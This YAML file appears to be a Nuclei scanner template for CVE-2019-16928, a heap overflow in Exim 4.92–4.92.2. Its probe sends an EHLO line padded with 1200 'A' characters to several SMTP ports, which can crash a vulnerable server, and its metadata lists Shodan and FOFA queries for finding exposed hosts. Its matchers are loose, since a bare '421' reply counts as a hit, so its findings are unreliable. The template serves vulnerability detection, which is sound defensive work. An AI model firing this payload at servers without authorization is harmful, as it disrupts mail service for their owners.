id: CVE-2019-16928

info:
  name: Exim 4.92-4.92.2 - Heap Buffer Overflow
  author: mavrickrishi
  severity: critical
  description: |
    Exim versions 4.92 through 4.92.2 contain a heap-based buffer overflow vulnerability in the string_vformat()
    function in string.c. The vulnerability can be exploited by sending an extraordinarily long EHLO command
    to crash the Exim process or potentially achieve remote code execution. This flaw affects mail servers
    running vulnerable Exim versions, potentially allowing attackers to disrupt mail service availability
    or execute arbitrary code with the privileges of the Exim process. The vulnerability exists due to improper
    length validation when processing EHLO commands, making it possible for remote unauthenticated attackers
    to trigger a buffer overflow condition by sending a specially crafted SMTP command.
  remediation: |
    Update Exim to version 4.92.3 or later which includes the security fix for this vulnerability.
  reference:
    - https://www.exim.org/static/doc/security/CVE-2019-16928.txt
    - https://bugs.exim.org/show_bug.cgi?id=2449
    - https://www.openwall.com/lists/oss-security/2019/09/28/1
    - https://git.exim.org/exim.git/patch/478effbfd9c3cc5a627fc671d4bf94d13670d65f
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16928
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-16928
    cwe-id: CWE-122
    epss-score: 0.0562
    epss-percentile: 0.93279
    cpe: cpe:2.3:a:exim:exim:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: exim
    product: exim
    shodan-query: "Exim port:25"
    fofa-query: banner="220" && banner="ESMTP Exim"
  tags: cve,cve2019,exim,smtp,heap_overflow,rce,network,kev

tcp:
  - inputs:
      # Send EHLO command with 1200 'A' characters to trigger heap buffer overflow
      # This length exceeds the vulnerable buffer size in string_vformat() function
      - data: "EHLO {{repeat('A', 1200)}}.test\r\n"
        read: 1024

    host:
      - "{{Host}}:25"    # Standard SMTP port
      - "{{Host}}:587"   # SMTP submission port
      - "{{Host}}:465"   # SMTPS (SMTP over SSL) port
      - "{{Host}}:8825"  # Custom test port

    matchers:
      - type: word
        words:
          # Check for vulnerable Exim version (4.92.0, 4.92.1, or 4.92.2)
          - "ESMTP Exim 4.92"
          # Check for service crash response indicating successful exploitation
          - "421"

    extractors:
      - type: regex
        part: data
        name: exim_version
        regex:
          # Extract specific vulnerable version number for reporting
          - "ESMTP Exim (4\\.92\\.[0-2])"
        group: 1

      - type: regex
        part: data
        name: hostname
        regex:
          # Extract hostname from SMTP banner for additional context
          - "220 ([^\\s]+)"
        group: 1